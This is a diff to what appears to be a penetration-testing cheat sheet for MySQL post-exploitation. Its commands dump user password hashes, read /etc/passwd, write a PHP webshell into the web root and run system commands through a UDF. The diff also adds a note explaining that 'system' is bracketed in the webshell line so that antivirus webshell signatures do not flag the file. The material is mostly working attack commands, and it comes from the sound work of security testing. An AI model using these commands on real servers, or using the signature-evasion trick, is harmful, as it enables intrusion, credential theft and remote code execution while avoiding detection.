@@ -51,11 +51,14 @@ SELECT user,password FROM mysql.user;
 SELECT LOAD_FILE('/etc/passwd');
 
 -- Write files
-SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+SELECT '<?php syst[e]m($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 
 -- Command execution (UDF)
 SELECT sys_exec('whoami');
 ```
+
+> `syst[e]m` is `system`, bracketed so this file does not match antivirus
+> webshell signatures. See "Antivirus false positives" in the repo README.
 
 ## MSSQL (Port 1433)
 
